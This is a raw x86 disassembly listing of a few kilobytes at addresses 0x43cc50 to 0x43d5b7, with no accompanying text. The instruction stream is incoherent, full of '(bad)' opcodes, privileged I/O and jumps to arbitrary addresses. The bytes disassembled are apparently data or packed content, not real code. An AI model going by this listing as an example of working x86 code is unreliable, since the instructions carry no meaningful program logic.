  43cc50:	mov    ds:0xe7900ed0,al
  43cc55:	pop    esi
  43cc56:	mov    al,ds:0x37aaa90e
  43cc5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43cc5c:	scas   eax,DWORD PTR es:[edi]
  43cc5d:	inc    esi
  43cc5e:	push   cs
  43cc5f:	add    BYTE PTR [esi],dl
  43cc61:	jg     0x43ccc5
  43cc63:	jl     0x43cc2a
  43cc65:	add    eax,0xe7c0eff8
  43cc6a:	sub    eax,DWORD PTR [ecx-0x5f]
  43cc6d:	xor    BYTE PTR [edx+0x1986e1cb],0x20
  43cc74:	mov    bl,0xc7
  43cc76:	(bad)  
  43cc77:	push   DWORD PTR [edx]
  43cc79:	mov    bl,0x97
  43cc7b:	(bad)  [edx+0x208252c7]
  43cc81:	sub    cl,BYTE PTR [ebx]
  43cc83:	add    BYTE PTR [ecx+0x69414c32],al
  43cc89:	stos   DWORD PTR es:[edi],eax
  43cc8a:	fwait
  43cc8b:	mov    DWORD PTR [edx-0x39],0x4463a232
  43cc92:	mov    eax,ds:0xbb4416fb
  43cc97:	cmp    al,0x63
  43cc99:	das    
  43cc9a:	mov    eax,ds:0x6bd0f5
	...
  43ccbb:	add    BYTE PTR [eax],dh
  43ccbd:	mov    esp,0x69305be8
  43ccc2:	push   DWORD PTR [esi]
  43ccc4:	push   esi
  43ccc5:	daa    
  43ccc6:	scas   eax,DWORD PTR es:[edi]
  43ccc7:	adc    eax,DWORD PTR [esi+0x3a]
  43ccca:	cmp    ebp,ebx
  43cccc:	fsub   DWORD PTR [edi+eiz*8]
  43cccf:	test   BYTE PTR [eax],al
  43ccd1:	cmp    edi,edx
  43ccd3:	dec    ebx
  43ccd4:	pop    ecx
  43ccd5:	pop    ebp
  43ccd6:	ds jmp 0xd9b84c36
  43ccdc:	ss cwde 
  43ccde:	aad    0xfe
  43cce0:	push   edi
  43cce1:	sti    
  43cce2:	add    edi,DWORD PTR [edx+0x4]
  43cce5:	outs   dx,DWORD PTR ds:[esi]
  43cce6:	std    
  43cce7:	dec    edx
  43cce8:	inc    ecx
  43cce9:	pop    ebp
  43ccea:	ds jmp 0xe5b8237d
  43ccf0:	adc    bh,BYTE PTR [esi]
  43ccf2:	jo     0x43cc8a
  43ccf4:	jle    0x43ccf6
  43ccf6:	push   edi
  43ccf7:	stos   BYTE PTR es:[edi],al
  43ccf8:	mov    dh,0xef
  43ccfa:	fldcw  WORD PTR [edx]
  43ccfc:	or     DWORD PTR [esi-0x11202e06],esp
  43cd02:	cli    
  43cd03:	mov    dh,0xab
  43cd05:	jecxz  0x43cce0
  43cd07:	sub    dl,BYTE PTR [ecx]
  43cd09:	test   DWORD PTR [edi-0x52cd1e3],edi
  43cd0f:	(bad)  
  43cd11:	adc    eax,DWORD PTR [ecx+edi*8+0x4e]
  43cd15:	aas    
  43cd16:	dec    edx
  43cd17:	dec    edx
  43cd18:	neg    BYTE PTR [ecx+0x3e]
  43cd1b:	jmp    0x2b1db0c9
	...
  43cd3c:	add    BYTE PTR [eax],al
  43cd3e:	adc    DWORD PTR [ebx],edi
  43cd40:	das    
  43cd41:	sbb    bl,BYTE PTR ss:[edx+0x3e]
  43cd45:	jmp    0x51960aa2
  43cd4a:	jnp    0x43cd94
  43cd4c:	cli    
  43cd4d:	pop    esi
  43cd4e:	jle    0x43cd50
  43cd50:	pop    ebx
  43cd51:	sub    bh,al
  43cd53:	aas    
  43cd54:	mov    esi,0x802a9bb4
  43cd59:	add    BYTE PTR [eax-0xb0003c6],bh
  43cd5f:	rol    BYTE PTR [ebx+0x8],1
  43cd62:	cmc    
  43cd63:	dec    edi
  43cd64:	push   ds
  43cd65:	push   0x39e964
  43cd6a:	sahf   
  43cd6b:	add    ch,al
  43cd6d:	xchg   edi,eax
  43cd6e:	sub    cl,cl
  43cd70:	cmc    
  43cd71:	test   BYTE PTR [eax+edx*2],dh
  43cd74:	(bad)  
  43cd75:	xor    DWORD PTR [esi+ebx*8],esp
  43cd78:	xor    al,0x68
  43cd7a:	pop    esp
  43cd7b:	mov    ds:0x49e0039,eax
  43cd80:	call   0xf60ce608
  43cd85:	test   ah,ah
  43cd87:	dec    esi
  43cd88:	out    0x68,al
  43cd8a:	mov    al,ds:0x39000001
  43cd8f:	mov    edi,0xc8bbfdf2
  43cd94:	dec    edx
  43cd95:	push   0xffffffa4
  43cd97:	(bad)  
  43cd98:	adc    ebp,eax
  43cd9a:	mov    dh,0x42
  43cd9c:	cli    
  43cd9d:	mov    ecx,?
  43cd9f:	retf   
  43cda0:	sti    
  43cda1:	inc    DWORD PTR [eax]
	...
  43cdbf:	add    BYTE PTR [ebx-0x18821d8e],bh
  43cdc5:	enter  0x85f5,0xa4
  43cdc9:	fs jbe 0x43cdaa
  43cdcc:	aaa    
  43cdcd:	add    al,0x7
  43cdcf:	xchg   ebp,eax
  43cdd0:	mov    ah,0xfa
  43cdd2:	mov    esp,0x816d6404
  43cdd7:	in     al,dx
  43cdd8:	in     eax,0xd7
  43cdda:	xchg   edx,eax
  43cddb:	add    al,0x34
  43cddd:	add    ch,dh
  43cddf:	inc    ebp
  43cde0:	sub    al,0x1
  43cde2:	dec    ebx
  43cde3:	push   esi
  43cde4:	and    edi,DWORD PTR [ecx]
  43cde6:	jle    0x43cd6e
  43cde8:	and    al,0x2
  43cdea:	add    BYTE PTR [eax+0x43dcb409],al
  43cdf0:	or     eax,0x930afd29
  43cdf5:	fadd   QWORD PTR [ebx]
  43cdf7:	add    BYTE PTR ds:0xa2e2b3a,cl
  43cdfd:	inc    esi
  43cdfe:	jnp    0x43cd82
  43ce00:	mov    ebp,0x89ffbe66
  43ce05:	mov    ah,0xdb
  43ce07:	div    dl
  43ce09:	out    0x5b,al
  43ce0b:	ret    0x1e2c
  43ce0e:	dec    ecx
  43ce0f:	mov    WORD PTR [eax-0x2505bcf1],cs
  43ce15:	ja     0x43ce2a
  43ce17:	sar    BYTE PTR ds:0x85b24797,0x6e
  43ce1e:	mov    esi,0xe93652ff
  43ce23:	push   edi
	...
  43ce40:	add    BYTE PTR [eax],al
  43ce42:	push   ds
  43ce43:	inc    BYTE PTR [si-0x2333]
  43ce48:	sbb    al,0x87
  43ce4a:	shl    edi,cl
  43ce4c:	jb     0x43cdd2
  43ce4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ce4f:	push   esp
  43ce50:	inc    edi
  43ce51:	cli    
  43ce52:	cmp    eax,0xb00f5bf7
  43ce57:	inc    ebp
  43ce58:	inc    edi
  43ce59:	test   BYTE PTR [ebp-0xd],cl
  43ce5c:	lock cli 
  43ce5e:	cmp    bl,dh
  43ce60:	and    eax,0x79dc0d3e
  43ce65:	div    DWORD PTR [eax+0x66]
  43ce68:	inc    edi
  43ce69:	dec    edi
  43ce6a:	push   0x34
  43ce6c:	sahf   
  43ce6d:	or     eax,0xbf7926cd
  43ce72:	loope  0x43ce95
  43ce74:	add    edx,0x1
  43ce77:	jmp    0xe668:0x38e1fa84
  43ce7e:	jmp    0x864efb84
  43ce83:	stos   BYTE PTR es:[edi],al
  43ce84:	mov    cl,BYTE PTR [edx-0x33]
  43ce87:	(bad)  
  43ce88:	call   0x3b23e087
  43ce8d:	les    esp,FWORD PTR [edx]
  43ce8f:	sub    dh,ch
  43ce91:	push   ecx
  43ce92:	adc    eax,esp
  43ce94:	sub    al,ah
  43ce96:	adc    al,BYTE PTR [eax]
  43ce98:	mov    ebp,0x90a8dfd
  43ce9d:	sub    al,BYTE PTR [ebx+0x0]
  43cea0:	dec    ecx
  43cea1:	clc    
  43cea2:	cli    
  43cea3:	cmp    al,0x89
  43cea5:	test   eax,0x0
	...
  43cec2:	add    BYTE PTR [eax],al
  43cec4:	mov    ds:0xa83abdfe,al
  43cec9:	add    ebp,ecx
  43cecb:	scas   al,BYTE PTR es:[edi]
  43cecc:	mov    ebp,DWORD PTR [ebx]
  43cece:	addr16 push edi
  43ced0:	inc    BYTE PTR ds:0xd64203e9
  43ced6:	cdq    
  43ced7:	jl     0x43cee2
  43ced9:	loopne 0x43ceb1
  43cedb:	ret    
  43cedc:	ret    0x28a4
  43cedf:	xor    ebx,edi
  43cee1:	(bad)  
  43cee2:	jmp    0x4e9cb216
  43cee7:	and    al,0xfa
  43cee9:	aas    
  43ceea:	xor    eax,0x2548b286
  43ceef:	add    al,0x3f
  43cef1:	xchg   ebx,ebp
  43cef3:	(bad)  
  43cef4:	mov    esp,0xabdde8c0
  43cef9:	jnp    0x43ce8d
  43cefb:	ret    
  43cefc:	and    BYTE PTR [edx-0x3fa3737b],0xe8
  43cf03:	jl     0x43cf16
  43cf05:	jo     0x43cec1
  43cf07:	ret    
  43cf08:	push   0x3d
  43cf0a:	repz mov bl,0xfc
  43cf0d:	mov    edi,0xb4e82e8
  43cf12:	xor    eax,DWORD PTR [edi+0x3f]
  43cf15:	mov    bh,BYTE PTR [ebx]
  43cf17:	pop    eax
  43cf18:	inc    ebp
  43cf19:	cmp    al,0x79
  43cf1b:	pop    esp
  43cf1c:	je     0x43cee7
  43cf1e:	push   DWORD PTR [esi-0x2e]
  43cf21:	test   DWORD PTR [edi],edi
  43cf23:	in     eax,dx
  43cf24:	outs   dx,DWORD PTR ds:[esi]
  43cf25:	or     al,0xcc
  43cf27:	stos   BYTE PTR es:[edi],al
	...
  43cf44:	add    BYTE PTR [eax],al
  43cf46:	push   cs
  43cf47:	ja     0x43cf32
  43cf49:	call   0x2fcacf5c
  43cf4e:	cdq    
  43cf4f:	adc    al,0x40
  43cf51:	mov    al,ds:0x7c8c323d
  43cf56:	aaa    
  43cf57:	xor    bh,dl
  43cf59:	ds popa 
  43cf5b:	mov    DWORD PTR [ebp+0x37],eax
  43cf5e:	push   edx
  43cf5f:	add    al,0xae
  43cf61:	call   0xfda9cf74
  43cf66:	sahf   
  43cf67:	retf   0x948c
  43cf6a:	push   ds
  43cf6b:	mov    edx,0xc53916c7
  43cf70:	jg     0x43cf80
  43cf72:	dec    edx
  43cf73:	test   BYTE PTR [edi-0x3e7d4a79],bh
  43cf79:	cdq    
  43cf7a:	out    0x83,al
  43cf7c:	fild   QWORD PTR [edx+0x21848d0e]
  43cf82:	inc    esp
  43cf83:	ss cli 
  43cf85:	cmp    DWORD PTR [ecx+0x17],ecx
  43cf88:	(bad)  
  43cf8a:	dec    ebx
  43cf8b:	test   BYTE PTR [edi+0x357b1de6],bh
  43cf91:	stos   BYTE PTR es:[edi],al
  43cf92:	mov    ebp,0x68a92f08
  43cf97:	mov    BYTE PTR [ecx+esi*4+0x70fa35d5],al
  43cf9e:	loopne 0x43cf9f
  43cfa0:	(bad)  
  43cfa1:	call   0xa319539b
  43cfa6:	shl    DWORD PTR ds:0x187,cl
	...
  43cfc8:	dec    ecx
  43cfc9:	enter  0x9374,0x36
  43cfcd:	outs   dx,DWORD PTR ds:[esi]
  43cfce:	xchg   BYTE PTR [ecx],ch
  43cfd0:	or     DWORD PTR [ebp-0x3783ff7c],ecx
  43cfd6:	cmc    
  43cfd7:	jmp    DWORD PTR [ebx+eax*8]
  43cfda:	adc    ebx,DWORD PTR [eax-0x7d05c0ab]
  43cfe0:	adc    esp,ecx
  43cfe2:	cmc    
  43cfe3:	push   ebx
  43cfe4:	addr16 pop ecx
  43cfe6:	stc    
  43cfe7:	push   edx
  43cfe8:	ds add al,0x68
  43cfeb:	add    BYTE PTR [edi+edi*8],ah
  43cfee:	jg     0x43cf7d
  43cff0:	test   eax,0x53fffbf6
  43cff5:	outs   dx,DWORD PTR ds:[esi]
  43cff6:	mov    ebp,0xffc54045
  43cffb:	jmp    esp
  43cffd:	rcl    DWORD PTR [ebx],0x40
  43d000:	(bad)  
  43d001:	ds cli 
  43d003:	mov    al,BYTE PTR [esi+edi*2]
  43d006:	clc    
  43d007:	(bad)  
  43d008:	js     0x43d023
  43d00a:	dec    ebx
  43d00b:	lea    ebp,[ecx+0x79ff4ac2]
  43d011:	ret    0x858b
  43d014:	cld    
  43d015:	(bad)  
  43d016:	cmc    
  43d017:	jmp    DWORD PTR [esp+ebp*2+0x306815f5]
  43d01e:	cmp    al,BYTE PTR [eax]
  43d020:	sub    DWORD PTR [edi+0x7b1f066e],edi
  43d026:	test   BYTE PTR [ecx-0xaf3417],0x0
	...
  43d049:	add    BYTE PTR [ecx-0x5bbff6c6],bl
  43d04f:	mov    bh,0x43
  43d051:	clc    
  43d052:	test   ebx,0x966874f5
  43d058:	push   DWORD PTR [ebx+0x66]
  43d05b:	xadd   cl,dl
  43d05e:	dec    esp
  43d05f:	adc    cl,cl
  43d061:	fnsavew [edi-0x3b7e37bd]
  43d068:	cmc    
  43d069:	lea    ecx,ds:0x52fc3bac
  43d06f:	mov    DWORD PTR [ebx+0x17],ebx
  43d072:	sub    eax,0x888c4482
  43d077:	jo     0x43d0bb
  43d079:	cli    
  43d07a:	cmp    al,BYTE PTR [eax-0x56cdf828]
  43d080:	fist   DWORD PTR [ebx-0x77019abd]
  43d086:	add    BYTE PTR [ecx-0x5ff2c1d7],bh
  43d08c:	loop   0x43d039
  43d08e:	cmp    esp,DWORD PTR [ebp-0x2]
  43d091:	cli    
  43d092:	loop   0x43d063
  43d094:	inc    eax
  43d095:	fld    QWORD PTR [edx]
  43d097:	sti    
  43d098:	fld    TBYTE PTR [ebx]
  43d09a:	je     0x43d103
  43d09c:	(bad)  
  43d09d:	cli    
  43d09e:	sbb    BYTE PTR [ebx+0x1e0d3ff0],dl
  43d0a4:	aas    
  43d0a5:	jae    0x43d0bb
  43d0a7:	scas   al,BYTE PTR es:[edi]
  43d0a8:	dec    ebx
  43d0a9:	out    0x41,eax
  43d0ab:	cld    
  43d0ac:	inc    esp
  43d0ad:	cli    
	...
  43d0ca:	add    BYTE PTR [eax],al
  43d0cc:	out    0x25,al
  43d0ce:	adc    al,al
  43d0d0:	pop    es
  43d0d1:	out    0xcf,al
  43d0d3:	add    cl,BYTE PTR [esi+0x4ec6522c]
  43d0d9:	daa    
  43d0da:	std    
  43d0db:	out    0xa9,eax
  43d0dd:	adc    eax,0xc14afa45
  43d0e2:	xchg   ebx,eax
  43d0e3:	add    BYTE PTR [esi+0x70],al
  43d0e6:	aas    
  43d0e7:	push   esp
  43d0e8:	xchg   BYTE PTR [ebx+0x7f],al
  43d0eb:	jecxz  0x43d082
  43d0ed:	test   al,0x52
  43d0ef:	inc    ebx
  43d0f0:	adc    ah,BYTE PTR [edi]
  43d0f2:	dec    BYTE PTR [esi-0x25]
  43d0f5:	adc    DWORD PTR [ecx],edx
  43d0f7:	xlat   BYTE PTR ds:[ebx]
  43d0f8:	xchg   BYTE PTR [eax+0x7f],dh
  43d0fb:	loop   0x43d109
  43d0fd:	mov    al,ds:0x1923b2
  43d102:	jo     0x43d0ea
  43d104:	push   cs
  43d105:	and    esp,DWORD PTR ds:0x6001e004
  43d10b:	out    0xf2,al
  43d10d:	pop    ecx
  43d10e:	and    eax,0xba27dc04
  43d113:	dec    eax
  43d114:	inc    edi
  43d115:	cmp    DWORD PTR [ebx+eax*2-0x3f],esp
  43d119:	add    BYTE PTR [edi-0x1841dabd],dh
  43d11f:	add    ecx,DWORD PTR ds:0xd03d0cd
  43d125:	or     cl,ch
  43d127:	mov    al,0x17
  43d129:	adc    eax,DWORD PTR ds:0x85ffd2f3
  43d12f:	sub    eax,DWORD PTR [eax]
	...
  43d14d:	add    ah,bl
  43d14f:	mov    esp,0xb2c208e8
  43d154:	aad    0x44
  43d156:	and    DWORD PTR [eax-0x29],esp
  43d159:	ret    
  43d15a:	repnz pop ebp
  43d15c:	adc    BYTE PTR ds:0xe671002b,ch
  43d162:	retf   
  43d163:	inc    esp
  43d164:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d165:	add    esi,edx
  43d167:	add    BYTE PTR [ebx],ch
  43d169:	dec    bl
  43d16b:	inc    esp
  43d16c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d16d:	add    ecx,DWORD PTR [esi+eiz*4]
  43d170:	hlt    
  43d171:	mov    ebp,DWORD PTR [edx+0x5a]
  43d174:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d175:	add    edx,DWORD PTR [eax+ecx*4-0x30]
  43d179:	xor    BYTE PTR [edx+0x7],0xa0
  43d17d:	into   
  43d17e:	mov    ds:0x10e41b84,al
  43d183:	shr    al,0xab
  43d186:	adc    bl,BYTE PTR [edx+0x25]
  43d189:	add    al,0x96
  43d18b:	push   ecx
  43d18c:	inc    eax
  43d18d:	pop    eax
  43d18e:	push   ebx
  43d18f:	mov    esp,0x8a5c42e8
  43d194:	and    al,0xe8
  43d196:	or     dl,al
  43d198:	inc    DWORD PTR [eax+0xb]
  43d19b:	cmp    bh,dl
  43d19d:	jmp    0xb32fed3b
  43d1a2:	dec    edx
  43d1a3:	cmp    cl,bh
  43d1a5:	hlt    
  43d1a6:	mov    dh,0x13
  43d1a8:	inc    eax
  43d1a9:	jmp    0xdd678e31
  43d1ae:	neg    BYTE PTR [edx-0xa]
  43d1b1:	xchg   BYTE PTR [eax],al
	...
  43d1cf:	add    dh,cl
  43d1d1:	jl     0x43d192
  43d1d3:	cmc    
  43d1d4:	nop
  43d1d5:	icebp  
  43d1d6:	idiv   ah
  43d1d8:	sub    ecx,ecx
  43d1da:	dec    esi
  43d1db:	add    edx,DWORD PTR [eax]
  43d1dd:	test   al,0x57
  43d1df:	inc    edi
  43d1e0:	dec    edx
  43d1e1:	cmp    cl,bh
  43d1e3:	hlt    
  43d1e4:	and    cl,BYTE PTR [edi]
  43d1e6:	inc    eax
  43d1e7:	jmp    0x4443dd77
  43d1ec:	shl    BYTE PTR [edi],cl
  43d1ee:	stc    
  43d1ef:	mov    cl,BYTE PTR [ebp+0x23]
  43d1f2:	ds jmp 0x6d4e48f3
  43d1f8:	sar    BYTE PTR [edx],cl
  43d1fa:	cli    
  43d1fb:	cs cmp esi,ebx
  43d1fe:	sti    
  43d1ff:	es dec esi
  43d201:	cmp    DWORD PTR [edi-0x5366d12],0x16
  43d208:	dec    esi
  43d209:	cmp    dh,BYTE PTR [ebx-0x3b]
  43d20c:	sbb    ch,BYTE PTR [eax]
  43d20e:	pop    eax
  43d20f:	add    eax,0x29833a4e
  43d214:	push   ds
  43d215:	jl     0x43d253
  43d217:	test   BYTE PTR [edi+0x3a],0xfa
  43d21b:	aam    0xf6
  43d21d:	cmovo  ebp,ecx
  43d220:	sub    edx,DWORD PTR [ebx-0x10eed523]
  43d226:	neg    BYTE PTR [eax+edi*4+0x7e]
  43d22a:	adc    al,0x15
  43d22c:	out    dx,eax
  43d22d:	cmc    
  43d22e:	(bad)  
  43d22f:	call   FWORD PTR [ebp+edx*2-0x1f]
  43d233:	std    
	...
  43d250:	add    BYTE PTR [eax],al
  43d252:	mov    ebx,0xe00fb936
  43d257:	adc    eax,0x26bbfff7
  43d25c:	add    esi,DWORD PTR [edx+ecx*2]
  43d25f:	ds cli 
  43d261:	mov    ds:0x39dfac,al
  43d266:	aas    
  43d267:	div    BYTE PTR [ebx+0x2f]
  43d26a:	jmp    0x35e3f125
  43d26f:	add    eax,DWORD PTR [eax]
  43d271:	call   0x43d02b
  43d276:	pop    ss
  43d277:	xchg   ecx,eax
  43d278:	jle    0x43d29e
  43d27a:	jns    0x43d285
  43d27c:	add    BYTE PTR [eax],al
  43d27e:	fs ret 0x2c33
  43d282:	fidivr DWORD PTR ds:0xdf8cb8fa
  43d288:	cmp    DWORD PTR [eax],eax
  43d28a:	int3   
  43d28b:	call   0x930c:0xbaf443dc
  43d292:	push   edi
  43d293:	jg     0x43d277
  43d295:	pop    edx
  43d296:	add    eax,0x1ea0fff5
  43d29c:	push   es
  43d29d:	call   0x39c93f
  43d2a2:	jo     0x43d267
  43d2a4:	add    eax,0xf5c12884
  43d2a9:	jmp    DWORD PTR [edx]
  43d2ab:	aas    
  43d2ac:	push   ds
  43d2ad:	or     al,0xb6
  43d2af:	outs   dx,BYTE PTR ds:[esi]
  43d2b0:	std    
  43d2b1:	out    0x9,eax
  43d2b3:	div    ebp
  43d2b5:	inc    DWORD PTR [eax]
	...
  43d2d3:	add    BYTE PTR [edi],cl
  43d2d5:	std    
  43d2d6:	scas   eax,DWORD PTR es:[edi]
  43d2d7:	add    DWORD PTR [esi-0x43],ebx
  43d2da:	add    eax,0x58207495
  43d2df:	pop    ebx
  43d2e0:	pop    ds
  43d2e1:	fistp  WORD PTR [ebx-0x3d]
  43d2e4:	or     eax,0x8eeb8cf4
  43d2e9:	cmp    al,0x3b
  43d2eb:	xor    BYTE PTR [ecx+0x30],0x6
  43d2ef:	add    BYTE PTR ds:0xb18cd90f,cl
  43d2f5:	add    al,0xa4
  43d2f7:	std    
  43d2f8:	push   0x28
  43d2fa:	or     BYTE PTR es:[esi],0x29
  43d2fe:	dec    BYTE PTR [ecx+eiz*8-0x6f184bc4]
  43d305:	in     eax,0x3d
  43d307:	cli    
  43d308:	xchg   esi,eax
  43d309:	test   al,0x25
  43d30b:	add    BYTE PTR ds:0x89fdac29,cl
  43d311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d312:	out    0xfc,eax
  43d314:	or     ebp,DWORD PTR [ecx]
  43d316:	(bad)  
  43d317:	push   eax
  43d318:	sub    ch,BYTE PTR [ebx]
  43d31a:	push   es
  43d31b:	(bad)  
  43d31c:	rol    DWORD PTR [eax+ebx*1],1
  43d31f:	push   0xffc4ca75
  43d324:	sub    bh,BYTE PTR [edi-0x6ef50699]
  43d32a:	sub    eax,0x8b270d00
  43d32f:	rcl    ebx,0x27
  43d332:	(bad)  
  43d333:	aas    
  43d334:	inc    esp
  43d335:	je     0x43d36c
  43d337:	mov    WORD PTR [eax],es
	...
  43d355:	add    BYTE PTR [ecx-0x5],dl
  43d358:	or     edx,DWORD PTR [eax+0x77]
  43d35b:	sub    BYTE PTR [esi-0x19544a9],ah
  43d361:	cli    
  43d362:	clc    
  43d363:	inc    esi
  43d364:	adc    eax,DWORD PTR [eax+0xd]
  43d367:	mov    ds:0xb3bb8433,al
  43d36c:	sbb    bl,bh
  43d36e:	and    BYTE PTR [ebx],ah
  43d370:	adc    eax,DWORD PTR [eax+0xd]
  43d373:	ins    BYTE PTR es:[edi],dx
  43d374:	ja     0x43d375
  43d376:	stos   BYTE PTR es:[edi],al
  43d377:	daa    
  43d378:	mov    cl,0x8
  43d37a:	cmp    eax,DWORD PTR [eax]
  43d37c:	loop   0x43d394
  43d37e:	adc    DWORD PTR [ecx],edx
  43d380:	sub    DWORD PTR [edx+eiz*8],eax
  43d383:	sub    eax,0xd64c8d31
  43d388:	pop    ebp
  43d389:	es loope 0x43d3cd
  43d38c:	in     al,dx
  43d38d:	add    esp,eax
  43d38f:	mov    ah,cl
  43d391:	test   BYTE PTR [esi+0x38],ch
  43d394:	addr16 das 
  43d396:	sahf   
  43d397:	sti    
  43d398:	call   0x24c691a0
  43d39d:	call   0x52afbb4
  43d3a2:	or     eax,0x1ab69200
  43d3a7:	mov    DWORD PTR [ebx],ebx
  43d3a9:	adc    BYTE PTR [eax+0xe66cc7c],dl
  43d3af:	add    cl,ch
  43d3b1:	shl    DWORD PTR [edi],cl
  43d3b3:	jmp    0x43d379
  43d3b5:	popa   
  43d3b6:	jmp    0x43d3b7
  43d3b8:	pop    ebp
  43d3b9:	mov    BYTE PTR [eax],0x0
	...
  43d3d8:	or     ch,BYTE PTR [eax-0x24da80]
  43d3de:	push   eax
  43d3df:	scas   eax,DWORD PTR es:[edi]
  43d3e0:	outs   dx,BYTE PTR ds:[esi]
  43d3e1:	ss push ecx
  43d3e3:	loopne 0x43d378
  43d3e5:	sbb    ch,BYTE PTR [ebx-0x63ffe9bb]
  43d3eb:	mov    esi,fs
  43d3ed:	or     BYTE PTR [ebx+ebp*4+0x5c],0x35
  43d3f2:	mov    ebx,0x50ba980f
  43d3f7:	shl    edi,cl
  43d3f9:	stos   BYTE PTR es:[edi],al
  43d3fa:	lock sub esp,DWORD PTR [esi-0x7ebfe6cc]
  43d401:	mov    edx,0x30d370
  43d406:	sbb    ebx,0x40e8c0e4
  43d40c:	and    eax,esp
  43d40e:	aad    0xc3
  43d410:	mov    dl,0x89
  43d412:	(bad)  
  43d413:	clc    
  43d414:	nop
  43d415:	cs jae 0x43d3ea
  43d418:	jo     0x43d453
  43d41a:	push   ecx
  43d41b:	out    0xf4,al
  43d41d:	adc    ecx,DWORD PTR [edi]
  43d41f:	sub    DWORD PTR [ecx],ecx
  43d421:	jnp    0x43d3e2
  43d423:	pop    ebp
  43d424:	and    al,0xf3
  43d426:	jg     0x43d411
  43d428:	push   cs
  43d429:	add    BYTE PTR [edi+esi*8+0x60],dh
  43d42d:	cmp    DWORD PTR [eiz*8-0x6003fe1],edx
  43d434:	into   
  43d435:	(bad)  
  43d436:	enter  0x11ab,0x0
  43d43a:	xchg   DWORD PTR [edi+0x0],ebp
	...
  43d458:	add    BYTE PTR [eax],al
  43d45a:	xor    dl,BYTE PTR es:[edx+esi*2+0x1d]
  43d45f:	rcl    BYTE PTR [eax+0x62],1
  43d462:	sbb    al,0xec
  43d464:	fldcw  WORD PTR [edx]
  43d466:	or     ebp,eax
  43d468:	push   edx
  43d469:	xchg   ecx,eax
  43d46a:	cmc    
  43d46b:	sbb    bh,ah
  43d46d:	jle    0x43d4ad
  43d46f:	dec    ebp
  43d470:	mov    BYTE PTR [ecx+ebp*8],ch
  43d473:	in     eax,dx
  43d474:	mov    esi,0xbfe50bf4
  43d479:	push   eax
  43d47a:	les    esi,FWORD PTR [edx+edi*8]
  43d47d:	jmp    0xba9106e6
  43d482:	popf   
  43d483:	mov    esp,0x36dbb907
  43d488:	je     0x43d47b
  43d48a:	xchg   ah,dl
  43d48c:	cli    
  43d48d:	shl    DWORD PTR [ebx],cl
  43d48f:	ss adc al,0x65
  43d492:	add    al,al
  43d494:	jmp    DWORD PTR [ebx+0x49]
  43d497:	lods   al,BYTE PTR ds:[esi]
  43d498:	add    ebp,DWORD PTR [edi]
  43d49a:	les    esi,FWORD PTR [esi]
  43d49c:	add    BYTE PTR [eax-0x17],cl
  43d49f:	pop    ecx
  43d4a0:	ds jmp 0xe0572835
  43d4a6:	aad    0x7
  43d4a8:	push   edx
  43d4a9:	add    BYTE PTR [edi],bh
  43d4ab:	cmp    DWORD PTR [esi+0x12],esp
  43d4ae:	dec    DWORD PTR fs:[edx-0x48]
  43d4b2:	aam    0xd5
  43d4b4:	cmp    DWORD PTR [eax],eax
  43d4b6:	iret   
  43d4b7:	or     BYTE PTR [esi+ebx*8],dh
  43d4ba:	out    0xfb,eax
  43d4bc:	popa   
  43d4bd:	add    al,0x0
	...
  43d4db:	add    BYTE PTR [edi+0x318df248],ah
  43d4e1:	adc    BYTE PTR [ecx+0x50],dl
  43d4e4:	cmp    esi,ebx
  43d4e6:	rol    BYTE PTR [ebp-0x206875c],1
  43d4ec:	sub    ebx,esi
  43d4ee:	dec    ecx
  43d4ef:	mov    eax,0x39d568
  43d4f4:	wbinvd 
  43d4f6:	xor    al,0xde
  43d4f8:	daa    
  43d4f9:	cld    
  43d4fa:	popa   
  43d4fb:	add    al,0x67
  43d4fd:	dec    eax
  43d4fe:	repnz (bad) 
  43d500:	icebp  
  43d501:	repz dec edi
  43d503:	push   eax
  43d504:	sti    
  43d505:	repnz rcr BYTE PTR [esi-0x57],1
  43d509:	mov    esi,0x47b20373
  43d50e:	cmc    
  43d50f:	jmp    FWORD PTR [ecx-0xd]
  43d512:	fiadd  WORD PTR [ebx+0x34]
  43d515:	mov    bh,0xf6
  43d517:	in     al,0x67
  43d519:	push   esi
  43d51b:	jne    0x43d4c9
  43d51d:	dec    ecx
  43d51e:	loop   0x43d4a6
  43d520:	imul   esi,edx,0xfffffff5
  43d523:	test   BYTE PTR [eax+edi*2],dh
  43d526:	stc    
  43d527:	std    
  43d528:	test   eax,0xe435f5f1
  43d52d:	out    0x39,eax
  43d52f:	add    BYTE PTR [edi+edi*8-0x1c],bl
  43d533:	inc    ebx
  43d534:	hlt    
  43d535:	icebp  
  43d536:	jae    0x43d530
  43d538:	fwait
  43d539:	out    0x61,al
  43d53b:	div    ebx
  43d53d:	icebp  
  43d53e:	jle    0x43d500
	...
  43d55c:	add    BYTE PTR [eax],al
  43d55e:	or     eax,0x48f9fd94
  43d563:	add    dh,bh
  43d565:	pop    esp
  43d566:	mov    edx,0xd6817b4
  43d56b:	test   eax,0x2a3efffe
  43d570:	mov    dl,0xf7
  43d572:	cmp    ah,BYTE PTR [edx]
  43d574:	adc    bh,BYTE PTR [eax-0x1]
  43d577:	call   0x521ebe7f
  43d57c:	cmp    al,0xfa
  43d57e:	xchg   esi,eax
  43d57f:	jecxz  0x43d5bc
  43d581:	push   esi
  43d582:	push   esp
  43d583:	or     ax,WORD PTR [eax]
  43d586:	out    0x28,eax
  43d588:	cmp    esi,DWORD PTR [ecx+esi*2]
  43d58b:	cmp    al,0xc0
  43d58d:	jmp    FWORD PTR [ebx+0x53]
  43d590:	sbb    cl,BYTE PTR [edi]
  43d592:	int    0x28
  43d594:	xor    edx,edi
  43d596:	imul   BYTE PTR [eax+0x34]
  43d599:	xlat   BYTE PTR ds:[ebx]
  43d59a:	dec    esi
  43d59b:	jmp    0x43d527
  43d59d:	imul   esi,ecx,0xffffff9c
  43d5a0:	jle    0x43d58d
  43d5a2:	or     DWORD PTR [edi],esp
  43d5a4:	(bad)  
  43d5a5:	jmp    ebx
  43d5a7:	stos   DWORD PTR es:[edi],eax
  43d5a8:	ret    0xdd63
  43d5ab:	mov    ds:0x61bde7c2,eax
  43d5b0:	ret    0xf563
  43d5b3:	sub    dh,bh
  43d5b5:	call   FWORD PTR [edx]
  43d5b7:	xor    ebx,DWORD PTR [esi]
